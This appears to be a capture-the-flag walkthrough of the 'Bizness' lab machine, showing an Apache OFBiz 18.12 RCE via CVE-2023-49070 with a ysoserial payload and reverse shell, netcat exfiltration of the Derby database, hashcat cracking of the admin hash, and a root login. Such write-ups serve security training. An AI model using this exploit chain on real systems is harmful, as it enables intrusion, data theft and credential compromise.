To find the total number of ports we run a fast `nmap` search.

```
nmap -p- --min-rate=1000 {target_ip}
```

When I visit the ip address I get the url `bizness.htb`

I add it to the hosts file:

```
echo {target ip} bizness.htb | sudo tee -a /etc/hosts
```

The footer of the page shows the web-app is powered by Apache Ofbiz and the version is `18.12`. Searching google I find an exploit CVE-2023-49070. There is an example of this exploit on github:

```
$ git clone https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC.git

$ cd ofbiz-CVE-2023-49070-RCE-POC

$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```
The script from `aboghazy2015` needs a copy of `ysoserial1` in the same directory in order to build a specific serialized payload with the desired command.
It builds an XML payload and submits it to `webtools/control/xmlrpc;/`

```
$ python exploit.py https://bizness.htb rce id

Error while generating or serializing payload

java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x6fa4fbe3) canno
t access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because mo
dule java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x6fa4fbe3 
        at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
        at ysoserial.payloads.CommonsBeanutils1.getObject(CommonsBeanutils1.java:20)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
                                                    
        Command didn't executed, please make sure you have java binary v11
        this exploit tested on this env
        openjdk version "11.0.17" 2022-10-18
        OpenJDK Runtime Environment (build 11.0.17+8-post-Debian-2)
        OpenJDK 64-Bit Server VM (build 11.0.17+8-post-Debian-2, mixed mode, sharing) 
```

I need to change my version of Java to 11

```
$ sudo update-alternatives --config java
```

There are several choices and choose `jdk 11`, then run it again with a `netcat listener` and using a shell to connect to our local `443` port.

```
nc -lnvp 443
```

```
$ $ python exploit.py https://bizness.htb shell 10.10.14.6:443
```
From there we get the user flag from `cat /home/ofbiz/user.txt`.

By default Apache Ofbiz uses the database `Derby`, I need to look for user information in the Derby database. 

Now I search for Derby:

```
$ find . -name seg0
./runtime/data/derby/ofbiz/seg0 ./runtime/data/derby/ofbizolap/seg0 ./runtime/data/derby/ofbiztenant/seg0
```

I compress them into one file:

```
$ tar -czf /tmp/0xdf.tar.gz derby
```

Send the compressed file back to our local via netcat, first the victim ip:

```
$ md5sum /tmp/0xdf.tar.gz
cb25d6b5c2cbbac1040520379cdc0e67 /tmp/0xdf.tar.gz

$ cat /tmp/0xdf.tar.gz | nc 10.10.14.6 80
```

Then on the local ip:
```
$ nc -lnvp 80 > derby.tar.gz

$ md5sum derby.tar.gz cb25d6b5c2cbbac1040520379cdc0e67 derby.tar.gz
```

The hashes from `md5sum` match, so the file came through uncorrupted.

To view the Derby files locally I download derby tools with:

```
$ sudo apt install derby-tools`
$ ij
ij version 10.14
> connect 'jdbc:derby:./ofbiz';
> describe OFBIZ.USER_LOGIN;
> select USER_LOGIN_ID, CURRENT_PASSWORD from OFBIZ.USER_LOGIN;

USER_LOGIN_ID |CURRENT_PASSWORD 
system |NULL 
anonymous |NULL 
admin |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

We crack this password by using its base64 and its salt

```
hash -> b64:salt
$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I -> b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```

Then we run hashcat to get the password:
```
hashcat -m 120 -a 0 hash /usr/share/wordlists/rockyou.txt

...
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
...
```

We use the password to get root:

```
su root
Password: monkeybizness
root@bizness:/home/ofbiz# id
uid=0(root) gid=0(root) groups=0(root)
```

We have root and can get the flag at 

```
cat /root/root.txt
```










